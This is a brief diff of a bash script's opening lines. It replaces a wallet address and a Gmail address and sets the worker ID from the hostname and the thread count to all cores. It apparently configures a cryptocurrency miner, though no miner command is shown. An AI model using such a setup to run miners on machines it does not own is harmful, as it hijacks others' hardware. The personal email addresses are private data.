@@ -1,8 +1,8 @@
 #!/bin/bash
 
-WALLET=449PWXiroeiJF2kzeHC4XKKea6Swt8TPLN3kfHwhwnM3L4wgvd49gksg5pH2xcchK67mb2vYex8V7dszBb6LnVGqPnsmX7n
+WALLET=452F3NnFWyHcjr9yfjVRH9jjYoz9fPr7eRNY6XjzPXQki9hsQxMNWZX1mX5fiSzmFRL4PyBuAGSa39tkMyD8pAM7H1x15C5
 ID="$(hostname)"
-MAIL=holtzerwilly@gmail.com
+MAIL=robbertopp1@gmail.com
 PASSWORD=$ID:$MAIL
 THREADS="$(nproc --all)"
 
